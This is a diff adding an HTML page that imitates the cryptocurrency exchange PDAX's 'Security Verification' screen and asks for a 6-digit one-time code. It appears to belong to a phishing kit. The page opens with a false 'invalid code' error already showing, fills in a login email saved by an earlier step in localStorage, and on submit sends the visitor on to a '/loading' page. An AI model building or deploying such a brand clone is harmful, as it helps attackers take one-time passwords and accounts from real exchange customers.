@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<base target="_top" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PDAX</title>
+<style>
+  :root { --green:#2bb24c; --red:#e02424; }
+  * { box-sizing:border-box; }
+  html,body { margin:0; min-height:100%; }
+  body { font-family:"Poppins",system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif; background:#fff; color:#1f2328; }
+
+  /* Header */
+  .header { height:72px; border-bottom:1px solid #eceef0; display:flex; align-items:center; padding:0 40px; }
+  .logo { display:flex; align-items:center; gap:8px; font-size:22px; font-weight:700; color:#1f2328; }
+  .logo svg { width:22px; height:22px; }
+
+  /* Content */
+  .wrap { max-width:560px; margin:0; padding:48px 40px 48px 150px; }
+  h1 { font-size:34px; font-weight:700; margin:0 0 30px; }
+  .label { font-size:16px; line-height:1.55; color:#3a3f45; margin:0 0 12px; }
+  .label .email { display:block; color:#1f2328; }
+  .field { position:relative; margin-bottom:10px; }
+  .field input { width:100%; height:58px; border:1px solid #d9dde1; border-radius:8px; padding:0 120px 0 18px; font-size:17px; color:#1f2328; outline:none; background:#fff; }
+  .field input:focus { border-color:var(--green); }
+  .field.error input { border-color:var(--red); background:#fff6f6; }
+  .field.error input:focus { border-color:var(--red); }
+  .field .resend { position:absolute; right:18px; top:29px; transform:translateY(-50%); font-size:15px; color:#a2a8af; pointer-events:none; }
+  .err { font-size:14px; color:var(--red); margin:0 0 20px; display:none; }
+  .err.show { display:block; }
+  .note { font-size:16px; line-height:1.6; color:#3a3f45; margin:26px 0; }
+  .support { font-size:16px; line-height:1.6; color:#3a3f45; margin:110px 0 20px; }
+  .support a { color:var(--green); text-decoration:none; }
+  .submit { width:100%; padding:17px; border:0; border-radius:8px; background:#a7d9b3; color:#fff; font-size:19px; font-weight:600; cursor:not-allowed; transition:background .15s; }
+  .submit.active { background:var(--green); cursor:pointer; }
+  .submit.active:hover { background:#249c43; }
+
+  /* click loader */
+  .loader { position:fixed; inset:0; z-index:50; display:none; align-items:center; justify-content:center; background:#fff; }
+  .loader .spin { width:48px; height:48px; border-radius:50%; border:4px solid #e3e7ea; border-top-color:var(--green); animation:rot .9s linear infinite; }
+  @keyframes rot { to { transform:rotate(360deg); } }
+
+  @media (max-width:860px){ .wrap{ padding:28px 20px; } h1{ font-size:28px; } .header{ padding:0 20px; } .support{ margin-top:60px; } }
+</style>
+</head>
+<body>
+  <div class="header">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 20L12 4l8 16-8-5-8 5z" fill="#2bb24c"/></svg>
+      PDAX
+    </div>
+  </div>
+
+  <div class="wrap">
+    <h1>Security Verification</h1>
+
+    <div class="label">Enter the 6-digit code sent to email <span class="email" id="emailMask">your email</span></div>
+    <div class="field error" id="emailField">
+      <input id="emailCode" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" autofocus />
+      <span class="resend">Resend in 04:45</span>
+    </div>
+    <p class="err show" id="err">The code you entered is invalid. Please try again.</p>
+
+    <p class="note">For security reasons, you are required to enter the unique one-time passwords sent to both your mobile number and email address.</p>
+
+    <p class="support">If you keep encountering errors in this step, please reach out to <a href="#">Customer Support</a>.</p>
+
+    <button class="submit" type="button" id="submit" disabled>Submit</button>
+  </div>
+
+  <div class="loader" id="loader"><div class="spin"></div></div>
+
+  <script>
+    // Masked email from saved login email: keep local part except last 5 chars, add 5 stars
+    (function () {
+      var email = '';
+      try { email = (localStorage.getItem('pdax_login_email') || '').trim(); } catch (e) {}
+      var masked = 'your email';
+      if (email.indexOf('@') > 0) {
+        var parts = email.split('@');
+        var name = parts[0];
+        var keep = Math.max(1, name.length - 5);
+        masked = name.slice(0, keep) + '*****' + '@' + parts[1];
+      }
+      document.getElementById('emailMask').textContent = masked;
+    })();
+
+    var mail = document.getElementById('emailCode');
+    var submit = document.getElementById('submit');
+    var field = document.getElementById('emailField');
+    var err = document.getElementById('err');
+
+    function validate() {
+      mail.value = mail.value.replace(/[^0-9]/g, '').slice(0, 6);
+      if (mail.value.length > 0) { field.classList.remove('error'); err.classList.remove('show'); }
+      if (mail.value.length === 6) {
+        submit.classList.add('active');
+        submit.disabled = false;
+      } else {
+        submit.classList.remove('active');
+        submit.disabled = true;
+      }
+    }
+    mail.addEventListener('input', validate);
+
+    submit.addEventListener('click', function () {
+      if (submit.disabled) return;
+      document.getElementById('loader').style.display = 'flex';
+      setTimeout(function () {
+        (window.top || window).location.href = '/loading';
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
